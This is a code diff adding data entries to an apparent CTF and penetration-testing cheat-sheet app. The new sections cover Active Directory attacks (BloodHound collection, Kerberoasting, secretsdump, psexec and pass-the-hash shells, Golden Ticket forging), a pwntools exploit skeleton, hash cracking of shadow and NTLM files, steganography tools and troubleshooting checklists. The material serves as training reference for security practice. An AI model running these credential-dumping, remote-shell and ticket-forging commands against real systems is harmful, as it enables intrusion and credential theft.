@@ -353,6 +353,66 @@ const CTF_DATA = [
   },
 
   /* ========================================================
+     ACTIVE DIRECTORY
+     ======================================================== */
+  {
+    id: "ad",
+    title: "Active Directory",
+    emoji: "🏰",
+    desc: "Collect the graph, roast tickets, dump secrets, then move laterally with hashes and tickets. netexec (ex-crackmapexec) and impacket do most of the work.",
+    groups: [
+      {
+        id: "bloodhound",
+        title: "BloodHound Collection & Analysis",
+        note: "Collect from any domain context, import the JSON/zip, mark owned nodes, then run the pre-built 'Shortest Path to Domain Admins' query.",
+        items: [
+          { cmd: "bloodhound-python -u USER -p 'PASS' -d DOMAIN -ns DC_IP -c all --zip", desc: "Remote collection from Linux — no agent needed on the DC.", tags: ["ad", "bloodhound", "collect", "python"] },
+          { cmd: "SharpHound.exe -c All --zipfilename loot.zip", desc: "On-host collection from a Windows foothold.", tags: ["ad", "bloodhound", "sharphound", "windows"] },
+          { cmd: "netexec ldap DC_IP -u USER -p 'PASS' --bloodhound --collection All --dns-server DC_IP", desc: "Collect straight through netexec's LDAP module.", tags: ["ad", "bloodhound", "netexec", "ldap"] },
+          { cmd: "sudo neo4j console   # then open BloodHound and import the zip", desc: "Start the graph DB, load data, mark owned, trace paths to high-value targets.", tags: ["ad", "bloodhound", "neo4j", "analysis"] }
+        ]
+      },
+      {
+        id: "roast",
+        title: "Kerberoasting / AS-REP Roasting",
+        note: "Kerberoast needs any domain creds and targets accounts with an SPN. AS-REP roast needs only a username list and targets accounts with pre-auth disabled.",
+        items: [
+          { cmd: "impacket-GetUserSPNs DOMAIN/USER:'PASS' -dc-ip DC_IP -request -outputfile tgs.txt", desc: "Request TGS tickets for all SPN accounts (Kerberoast).", tags: ["ad", "kerberoast", "impacket", "spn"] },
+          { cmd: "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP -format hashcat", desc: "AS-REP roast users with pre-auth disabled — no password required.", tags: ["ad", "asrep", "impacket", "preauth"] },
+          { cmd: "Rubeus.exe kerberoast /outfile:tgs.txt /nowrap", desc: "Kerberoast from a Windows foothold with Rubeus.", tags: ["ad", "kerberoast", "rubeus"] },
+          { cmd: "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt", desc: "AS-REP roast with Rubeus.", tags: ["ad", "asrep", "rubeus"] },
+          { cmd: "hashcat -m 13100 tgs.txt rockyou.txt   # AS-REP:  hashcat -m 18200 asrep.txt rockyou.txt", desc: "Crack the TGS (13100) or AS-REP (18200) hashes offline.", tags: ["ad", "hashcat", "crack", "13100", "18200"] }
+        ]
+      },
+      {
+        id: "impacket",
+        title: "impacket Toolkit",
+        items: [
+          { cmd: "impacket-secretsdump DOMAIN/USER:'PASS'@DC_IP", desc: "Dump SAM/LSA/NTDS secrets — the DCSync of choice with the right rights.", tags: ["ad", "impacket", "secretsdump", "ntds", "dcsync"] },
+          { cmd: "impacket-psexec DOMAIN/USER:'PASS'@RHOST", desc: "SYSTEM shell via service creation (noisy but reliable).", tags: ["ad", "impacket", "psexec", "shell"] },
+          { cmd: "impacket-wmiexec DOMAIN/USER:'PASS'@RHOST", desc: "Semi-interactive shell over WMI — quieter than psexec.", tags: ["ad", "impacket", "wmiexec", "shell"] },
+          { cmd: "impacket-smbclient DOMAIN/USER:'PASS'@RHOST", desc: "Browse SMB shares interactively.", tags: ["ad", "impacket", "smbclient", "smb"] },
+          { cmd: "impacket-mssqlclient DOMAIN/USER:'PASS'@RHOST -windows-auth", desc: "MSSQL client with integrated auth — enable xp_cmdshell for RCE.", tags: ["ad", "impacket", "mssql", "xp_cmdshell"] },
+          { cmd: "netexec smb RHOST -u USER -p 'PASS' --shares   # add --sam / --lsa / -x 'cmd'", desc: "netexec SMB for spraying, share listing, and command execution.", tags: ["ad", "netexec", "smb", "spray"] }
+        ]
+      },
+      {
+        id: "ptpth",
+        title: "Pass-the-Hash / Pass-the-Ticket",
+        note: "Once you own an NT hash or a Kerberos ticket, you rarely need the plaintext password again.",
+        items: [
+          { cmd: "impacket-psexec -hashes :NTHASH USER@RHOST", desc: "Pass-the-hash to a SYSTEM shell (LM left blank).", tags: ["ad", "pth", "pass-the-hash", "impacket"] },
+          { cmd: "netexec smb RHOST -u USER -H NTHASH --local-auth", desc: "Spray a hash across hosts to find where it is admin.", tags: ["ad", "pth", "netexec", "spray"] },
+          { cmd: "evil-winrm -i RHOST -u USER -H NTHASH", desc: "Interactive WinRM shell via pass-the-hash.", tags: ["ad", "pth", "evil-winrm", "winrm"] },
+          { cmd: "export KRB5CCNAME=ticket.ccache; impacket-psexec -k -no-pass DOMAIN/USER@TARGET.DOMAIN", desc: "Pass-the-ticket — use a Kerberos ccache instead of a password.", tags: ["ad", "ptt", "kerberos", "ccache"] },
+          { cmd: "Rubeus.exe ptt /ticket:BASE64TICKET   # then run tooling in that session", desc: "Inject a ticket into the current logon session on Windows.", tags: ["ad", "ptt", "rubeus", "ticket"] },
+          { cmd: "impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN Administrator", desc: "Forge a Golden Ticket once you have the krbtgt hash.", tags: ["ad", "golden-ticket", "krbtgt", "impacket"] }
+        ]
+      }
+    ]
+  },
+
+  /* ========================================================
      REVERSE SHELLS & FILE TRANSFER
      ======================================================== */
   {
@@ -393,6 +453,244 @@ const CTF_DATA = [
           { cmd: "scp file user@RHOST:/tmp/   /   scp user@RHOST:/path/file .", desc: "SCP transfer when you have SSH credentials.", tags: ["transfer", "scp", "ssh"] },
           { cmd: "base64 -w0 file   # then on target:  echo BASE64 | base64 -d > file", desc: "Base64 chunking — paste a binary through a shell with no network transfer.", tags: ["transfer", "base64", "paste", "chunk"] },
           { cmd: "impacket-smbserver share . -smb2support   # attacker    |    copy \\\\LHOST\\share\\f.exe .  # target", desc: "SMB share for fast Windows transfers (supports copy both ways).", tags: ["transfer", "smb", "impacket", "windows"] }
+        ]
+      }
+    ]
+  },
+
+  /* ========================================================
+     BINARY EXPLOITATION
+     ======================================================== */
+  {
+    id: "pwn",
+    title: "Binary Exploitation",
+    emoji: "🧨",
+    desc: "Check protections first — they decide the whole approach. Then fuzz, find the offset, clear bad chars, locate a return target and build the exploit.",
+    groups: [
+      {
+        id: "checksec",
+        title: "checksec",
+        items: [
+          { cmd: "checksec --file=./binary", desc: "Dump the binary's mitigations before anything else.", tags: ["pwn", "checksec", "mitigations"] },
+          { cmd: "file ./binary; strings ./binary | less; nm ./binary 2>/dev/null | grep -i win", desc: "Architecture, embedded strings, and giveaway functions like win()/system().", tags: ["pwn", "file", "strings", "nm"] }
+        ]
+      },
+      {
+        id: "checksec-ref",
+        title: "Protections — what each implies",
+        type: "ref",
+        items: [
+          { term: "NX / DEP", desc: "Stack is non-executable. No shellcode on the stack — pivot to ROP / ret2libc." },
+          { term: "Canary / Stack Guard", desc: "Random value before saved RIP. You must leak it (format string / partial overwrite) before smashing the return address." },
+          { term: "PIE", desc: "Binary base is randomised. You need a leak of a program address to compute gadget offsets." },
+          { term: "ASLR", desc: "Libc/stack/heap addresses randomised at runtime. Needs a leak; the binary itself is unaffected unless PIE is also on." },
+          { term: "RELRO (Full)", desc: "GOT is read-only — no GOT overwrite. Partial RELRO still allows GOT writes." }
+        ]
+      },
+      {
+        id: "bofmethod",
+        title: "Buffer Overflow Methodology",
+        type: "checklist",
+        items: [
+          "Fuzz: send growing cyclic input until the program crashes (SIGSEGV).",
+          "Find offset: cyclic 200 → crash → cyclic_find $rsp (pwntools) or pattern_offset.",
+          "Control EIP/RIP: overwrite with BBBB / 0x4242… and confirm in the debugger.",
+          "Bad chars: send \\x00-\\xff, diff memory, exclude bytes that get mangled.",
+          "Find return address: JMP ESP gadget (32-bit) or a ROP chain / win() address.",
+          "Space check: confirm enough room after the overwrite for your payload.",
+          "Build exploit: padding + saved-return overwrite + (ROP / shellcode / win args).",
+          "Test locally with ASLR off, then adapt the leak strategy for the remote."
+        ]
+      },
+      {
+        id: "pwntools",
+        title: "pwntools Boilerplate",
+        items: [
+          { cmd: "from pwn import *\ncontext.binary = elf = ELF('./binary')\n# p = process('./binary')\np = remote('RHOST', LPORT)\noffset = 72\npayload = flat({offset: elf.symbols['win']})\np.sendline(payload)\np.interactive()", desc: "Minimal exploit skeleton — local process or remote, with a flat() payload.", tags: ["pwn", "pwntools", "boilerplate", "exploit"] },
+          { cmd: "cyclic 200            # generate pattern\ncyclic -l 0x6161616c   # find the offset from the crash value", desc: "Offset discovery with pwntools' cyclic pattern.", tags: ["pwn", "pwntools", "cyclic", "offset"] },
+          { cmd: "ROPgadget --binary ./binary | grep 'pop rdi'", desc: "Find ROP gadgets (pop rdi; ret is the staple for 64-bit calls).", tags: ["pwn", "rop", "ropgadget", "gadget"] },
+          { cmd: "one_gadget /lib/x86_64-linux-gnu/libc.so.6", desc: "Find a single-jump execve(/bin/sh) gadget in libc for ret2libc.", tags: ["pwn", "one_gadget", "libc", "ret2libc"] },
+          { cmd: "gdb -q ./binary   # with pwndbg/gef:  pattern create 200 / pattern offset $rsp", desc: "Debug with pwndbg/gef for fast offset and gadget work.", tags: ["pwn", "gdb", "pwndbg", "gef"] }
+        ]
+      }
+    ]
+  },
+
+  /* ========================================================
+     CRYPTO / STEGANOGRAPHY / FORENSICS
+     ======================================================== */
+  {
+    id: "crypto",
+    title: "Crypto / Steg / Forensics",
+    emoji: "🔐",
+    desc: "Identify before you attack. Hash type, cipher family or file structure decides the tool. rockyou.txt lives at /usr/share/wordlists/rockyou.txt.",
+    groups: [
+      {
+        id: "stegtools",
+        title: "Steg & Forensics Tools",
+        items: [
+          { cmd: "binwalk -e file   # --dd='.*' to force-extract everything", desc: "Detect and carve embedded files/filesystems from a blob.", tags: ["forensics", "binwalk", "carve", "extract"] },
+          { cmd: "exiftool file", desc: "Read all metadata — authors, GPS, comments, hidden strings.", tags: ["forensics", "exiftool", "metadata"] },
+          { cmd: "steghide extract -sf image.jpg   # prompts for passphrase ('' often works)", desc: "Extract data hidden by steghide in JPEG/BMP/WAV/AU.", tags: ["steg", "steghide", "extract", "jpg"] },
+          { cmd: "stegseek image.jpg /usr/share/wordlists/rockyou.txt", desc: "Brute-force the steghide passphrase — far faster than stegcracker.", tags: ["steg", "stegseek", "brute", "steghide"] },
+          { cmd: "zsteg -a file.png", desc: "LSB / bit-plane steganography detection for PNG and BMP.", tags: ["steg", "zsteg", "lsb", "png"] },
+          { cmd: "foremost -i file -o out/", desc: "File carving by signature — recover deleted/embedded files.", tags: ["forensics", "foremost", "carve"] },
+          { cmd: "strings -n 8 file | less   # add -e l / -e b for wide chars", desc: "Pull printable strings; widen for UTF-16 blobs.", tags: ["forensics", "strings"] },
+          { cmd: "xxd file | head -40   # eyeball magic bytes vs the claimed extension", desc: "Hex dump to verify/spot the real file type.", tags: ["forensics", "xxd", "hex", "magic"] }
+        ]
+      },
+      {
+        id: "cracking",
+        title: "John & Hashcat",
+        note: "hashid/hash-identifier names the hash. unshadow merges passwd+shadow. Pick the right mode number from the table below.",
+        items: [
+          { cmd: "hashid -m 'HASH'   /   hash-identifier", desc: "Identify the hash type and get candidate hashcat modes.", tags: ["crack", "hashid", "identify"] },
+          { cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt", desc: "John auto-detects most formats; add --format=NAME to force one.", tags: ["crack", "john", "wordlist"] },
+          { cmd: "unshadow /etc/passwd /etc/shadow > hashes.txt; john hashes.txt", desc: "Combine passwd+shadow, then crack the unix user hashes.", tags: ["crack", "john", "unshadow", "shadow"] },
+          { cmd: "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", desc: "Hashcat straight dictionary attack (mode 0 = MD5).", tags: ["crack", "hashcat", "dictionary"] },
+          { cmd: "hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule", desc: "NTLM crack with the best64 rule set applied.", tags: ["crack", "hashcat", "ntlm", "rules"] },
+          { cmd: "hashcat -m 0 hash.txt -a 3 '?u?l?l?l?l?d?d'", desc: "Mask/brute-force attack for a known password pattern.", tags: ["crack", "hashcat", "mask", "brute"] }
+        ]
+      },
+      {
+        id: "hashmodes",
+        title: "Common Hashcat Modes",
+        type: "table",
+        columns: ["Mode", "Hash", "Notes"],
+        rows: [
+          ["0", "MD5", "32 hex chars"],
+          ["100", "SHA1", "40 hex chars"],
+          ["1400", "SHA-256", "64 hex chars"],
+          ["1700", "SHA-512", "128 hex chars"],
+          ["1000", "NTLM", "Windows; 32 hex chars"],
+          ["3200", "bcrypt", "starts $2a$ / $2b$"],
+          ["500", "md5crypt", "starts $1$ (Linux)"],
+          ["1800", "sha512crypt", "starts $6$ (Linux)"],
+          ["5600", "NetNTLMv2", "Responder captures"],
+          ["13100", "Kerberos TGS-REP", "Kerberoasting"],
+          ["18200", "Kerberos AS-REP", "AS-REP roasting"],
+          ["22000", "WPA-PBKDF2", "Wi-Fi handshakes"],
+          ["13400", "KeePass", ".kdbx databases"],
+          ["900", "MD4", "legacy"]
+        ]
+      },
+      {
+        id: "cipherid",
+        title: "Cipher Identification Tips",
+        type: "ref",
+        items: [
+          { term: "= padding, A-Za-z0-9+/", desc: "Base64. Decode with `base64 -d`. Base32 uses A-Z2-7 and more = padding." },
+          { term: "Only 0-9 a-f, even length", desc: "Hex. `xxd -r -p` or CyberChef 'From Hex'. Often wraps another layer." },
+          { term: "Letters only, word shapes kept", desc: "Substitution/Caesar/ROT. Try ROT13, then frequency analysis (e,t,a,o common)." },
+          { term: "Repeating-key feel, letters only", desc: "Vigenère. Find key length (Kasiski/IC), then solve per-column as Caesar." },
+          { term: "Two big numbers n,e (+ maybe c)", desc: "RSA. Factor small n (factordb/yafu), weak e=3, or common-modulus. Use RsaCtfTool." },
+          { term: "Same length in/out, XOR hints", desc: "XOR cipher. Single-byte: brute 0-255. Known-plaintext reveals the key." },
+          { term: "Dots and dashes / A1Z26 / Braille", desc: "Encoding, not encryption. Morse, letter-number, Braille — map with CyberChef." }
+        ]
+      }
+    ]
+  },
+
+  /* ========================================================
+     STUCK? START HERE
+     ======================================================== */
+  {
+    id: "stuck",
+    title: "Stuck? Start Here",
+    emoji: "🧭",
+    desc: "When the obvious path is exhausted, work a branch top to bottom. Tick items as you rule them out.",
+    groups: [
+      {
+        id: "stuck-web",
+        title: "Stuck on a web app",
+        type: "checklist",
+        items: [
+          "View source + all linked JS for comments, endpoints, API keys, hidden params.",
+          "Check /robots.txt, /sitemap.xml, /.git/, /.well-known/ for leaked paths.",
+          "Fuzz for backup/old files: .bak .old .zip .swp ~ and index.php.bak.",
+          "Try default / weak creds on every login (admin:admin, admin:password).",
+          "Enumerate HTTP methods (OPTIONS) — PUT/DELETE/TRACE may be enabled.",
+          "Inspect every cookie and response header; decode JWTs, test weak secrets.",
+          "Fuzz hidden parameters with ffuf (burp-parameter-names) on each endpoint.",
+          "Add discovered vhosts to /etc/hosts and re-run content discovery per host.",
+          "Check for different behaviour when authenticated vs not on the same route."
+        ]
+      },
+      {
+        id: "stuck-priv",
+        title: "Stuck on privesc",
+        type: "checklist",
+        items: [
+          "Re-run linPEAS/winPEAS and actually read every red/yellow line.",
+          "sudo -l again — and check GTFOBins for each allowed binary.",
+          "Unusual SUID/SGID binaries and file capabilities (getcap -r /).",
+          "Writable cron jobs, systemd units, service binaries and their PATHs.",
+          "Run pspy — catch root cron/processes and passwords passed on the command line.",
+          "Hunt creds: config files, .bash_history, .env, DB connection strings, backups.",
+          "Reused passwords — try the web/db password for su and SSH on every user.",
+          "Kernel version vs known LPEs (PwnKit, DirtyPipe) only as a last resort.",
+          "Internal services on 127.0.0.1 (ss -tlnp) — port-forward and attack them."
+        ]
+      },
+      {
+        id: "stuck-box",
+        title: "Stuck on a box entirely",
+        type: "checklist",
+        items: [
+          "Scan ALL TCP ports (-p-), not just the top 1000 — the way in is often high.",
+          "UDP scan the top ports (SNMP 161, TFTP 69, DNS 53, IKE 500).",
+          "Re-enumerate subdomains and vhosts; brute the Host header.",
+          "Re-check service versions against searchsploit for a direct exploit.",
+          "Enumerate SMB/NFS/FTP for anonymous access and readable shares.",
+          "Look harder at the obvious service — read its docs and default paths.",
+          "Spray any creds you already have across every service and protocol.",
+          "Step back: what is this box themed around? The theme usually hints the path."
+        ]
+      }
+    ]
+  },
+
+  /* ========================================================
+     USEFUL LINKS
+     ======================================================== */
+  {
+    id: "links",
+    title: "Useful Links",
+    emoji: "🔗",
+    desc: "The references worth keeping one click away. All open in a new tab.",
+    groups: [
+      {
+        id: "links-privesc",
+        title: "Privilege Escalation",
+        type: "links",
+        items: [
+          { label: "GTFOBins", url: "https://gtfobins.github.io/", note: "Unix binaries abused for privesc / sudo escape" },
+          { label: "LOLBAS", url: "https://lolbas-project.github.io/", note: "Living-off-the-land Windows binaries" },
+          { label: "HackTricks — Linux Privesc", url: "https://book.hacktricks.xyz/linux-hardening/privilege-escalation", note: "The definitive checklist" },
+          { label: "HackTricks — Windows Privesc", url: "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation", note: "Windows LPE checklist" }
+        ]
+      },
+      {
+        id: "links-ref",
+        title: "References & Payloads",
+        type: "links",
+        items: [
+          { label: "HackTricks", url: "https://book.hacktricks.xyz/", note: "Methodology for nearly everything" },
+          { label: "PayloadsAllTheThings", url: "https://github.com/swisskyrepo/PayloadsAllTheThings", note: "Payloads and bypasses per vuln class" },
+          { label: "pentestmonkey Cheat Sheets", url: "https://pentestmonkey.net/category/cheat-sheet", note: "Reverse shells, SQLi, one-liners" },
+          { label: "OWASP Testing Guide", url: "https://owasp.org/www-project-web-security-testing-guide/", note: "Structured web testing reference" }
+        ]
+      },
+      {
+        id: "links-tools",
+        title: "Online Tools",
+        type: "links",
+        items: [
+          { label: "revshells.com", url: "https://www.revshells.com/", note: "Reverse shell generator + listener" },
+          { label: "CyberChef", url: "https://gchq.github.io/CyberChef/", note: "Encoding, crypto, data analysis swiss-army knife" },
+          { label: "Exploit-DB", url: "https://www.exploit-db.com/", note: "Public exploits (searchsploit mirror)" },
+          { label: "crackstation.net", url: "https://crackstation.net/", note: "Fast lookup for unsalted hashes" },
+          { label: "dcode.fr", url: "https://www.dcode.fr/en", note: "Cipher identification and solvers" }
         ]
       }
     ]
